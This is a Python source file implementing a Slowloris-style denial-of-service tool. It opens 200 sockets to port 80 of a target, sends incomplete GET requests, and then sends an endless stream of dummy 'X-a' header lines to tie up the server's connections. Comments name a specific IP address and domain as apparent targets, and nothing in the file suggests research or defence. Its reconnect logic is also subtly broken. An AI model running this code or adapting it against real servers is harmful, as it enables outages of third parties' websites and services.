import socket
import random
import time

#ip = input("Enter IP >> ")
# 216.59.16.123
# www.metaeventos.net


def Main(ip, filepath):
    try:
        global allthesockets
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
            "Accept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6,cs;q=0.5",
            "Connection: keep-alive"
        ]
        howmany_sockets = 200
        port = 80
        allthesockets = []

        print("Creating sockets...")
        with open(filepath, "w") as createSockets:
            createSockets.write("Creating sockets ... ")

        for k in range(howmany_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                allthesockets.append(s)
            except Exception as e:
                print(e)

        print(range(howmany_sockets), " sockets are ready.")
        num = 0
        for r in allthesockets:

            print("[", num, "]")
            num += 1
            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            print("Successfully sent [+] GET /? HTTP /1.1 ...")
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))

            with open(filepath, "w") as sentHeaders:
                sentHeaders.write("Successfully sent Headers ...")

            print("Successfully sent [+] Headers ...")

        while True:
            for v in allthesockets:
                try:
                    v.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    print("[-][-][*] Waiter sent.")
                except:
                    print("[-] A socket failed, reattempting...")
                    allthesockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip, port))
                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass

            with open(filepath, "w") as keepAlive:
                keepAlive.write("[*] Successfully sent KEEP-ALIVE headers\n Sleeping off ")

            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
            print("Sleeping off ...")
            time.sleep(1)


    except ConnectionRefusedError:
        print("[-] Connection refused, retrying...")
        Main(ip, filepath)


#Main()
